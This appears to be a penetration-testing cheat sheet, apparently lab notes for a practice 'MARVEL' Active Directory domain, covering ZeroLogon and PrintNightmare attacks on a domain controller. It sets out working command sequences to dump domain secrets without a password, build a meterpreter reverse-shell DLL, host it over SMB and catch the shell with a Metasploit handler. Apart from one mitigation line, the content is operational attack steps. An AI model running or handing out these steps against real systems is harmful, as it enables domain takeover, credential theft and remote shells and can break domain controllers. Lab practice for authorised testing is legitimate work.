## Additional Attacks
### ZeroLogon

VERY DANGEROUS to do, will break DC if you don't set password back  
What is ZeroLogon? - <https://www.trendmicro.com/en_us/what-is/zerologon.html>  
dirkjanm CVE-2020-1472 - <https://github.com/dirkjanm/CVE-2020-1472>   
SecuraBV ZeroLogon Checker - <https://github.com/SecuraBV/CVE-2020-1472>  

`python3 zerologon_tester.py HYDRA-DC 192.168.176.121`   
If vulnerable, then dump secrets with no password  
`secretsdump.py -just-dc MARVEL\HYRDA-DC\$@192.168.176.121`  

TO RESTORE PASSWORD and DC functionality  
`secretsdump.py administrator@192.168.176.121 -hashes`    
Find plain_password_hex, copy it for next command
`python3 restorepassword.py MARVEL/HYRDA-DC@HYDRA-DC -target-iup 192.168.176.121 -hexpass  (plain_password_hex)`   
***  
### PrintNightmare  CVE-2021-1675  
Check if vulnerable #print 
```
─$ rpcdump.py @192.168.176.121 | egrep 'MS-RPRN|MS-PAR'  
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol  
Protocol: [MS-RPRN]: Print System Remote Protocol  
```
1. Install latest version of impacket 
```
pip3 uninstall impacket  
git clone https://github.com/cube0x0/impacket   
cd impacket  
python3 ./setup.py install  
``` 
1. EXPLOIT : Copy CVE-2021-1675 locally  
2. Build malicious DLL with msvenom  
3. Setup multihandler in msfconsole, to catch payload
4. setup smb share with impacket to share dll as neccessary
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.176.129 LPORT=5555 -f dll > shell.dll   
./CVE-2021-1675.py MARVEL.LOCAL/fcastle:Password1@192.168.176.121 c:\shell.dll    
./CVE-2021-1675.py MARVEL.LOCAL/fcastle:Password1@192.168.176.121 \\192.168.176.129\share\shell.dll # or host with SMB  
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 192.168.176.129; set lport 5555; exploit"   
smbserver.py share `pwd` -smb2support 
```

Mitigation - Disable printer spooler service                                                          

CVE-2021-1675  
cube0x0 RCE - https://github.com/cube0x0/CVE-2021-1675
calebstewart LPE - https://github.com/calebstewart/CVE-2021-1675




***  
### Sam the Admin  


